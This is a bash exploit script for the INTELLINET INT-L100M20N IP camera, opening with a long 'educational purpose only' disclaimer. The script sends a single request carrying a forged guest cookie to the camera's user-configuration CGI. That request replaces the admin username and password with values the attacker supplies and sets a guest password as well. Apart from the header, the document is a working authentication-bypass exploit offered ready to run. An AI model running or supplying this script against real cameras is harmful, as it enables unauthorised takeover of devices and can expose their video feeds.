#!/bin/bash
#
#  INTELLINET IP Camera INT-L100M20N remote change admin user/password 
#
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  
#  Use them at your own risk!
#
#  
 
if [[ $# -gt 3 || $# -lt 2 ]]; then
        echo "  [ INTELLINET IP Camera INT-L100M20N  remote change admin user/password"
        echo "  [ ==="
        echo "  [ Usage: $0 <target> <user> <password>"
        echo "  [ Example: $0 192.168.1.200:80 admin teflon"
        echo "  [ ==="
        echo "  [ Copyright 2016 (c) Todor Donev  <todor.donev at gmail.com>" 
        echo "  [ Website:   http://www.ethical-hacker.org/"
        echo "  [ Facebook:  https://www.facebook.com/ethicalhackerorg "
        exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
        echo "  [ Error : libwww-perl not found =/"
        exit;
fi
        GET -H "Cookie: frame_rate=8; expansion=10; mode=43; user_id=guest; user_auth_level=43; behind_firewall=0" "http://$1/userconfigsubmit.cgi?adminid=$2&adpasswd=$3&repasswd=$3&user1=guest&userpw1=1337&repasswd1=1337&max_frame_user1=8&authority1=41&user2=&userpw2=&repasswd2=&max_frame_user2=6&authority2=40&user3=&userpw3=&repasswd3=&max_frame_user3=6&authority3=40&user4=&userpw4=&repasswd4=&max_frame_user4=6&authority4=40&user5=&userpw5=&repasswd5=&max_frame_user5=6&authority5=40&submit=submit" 0&> /dev/null <&1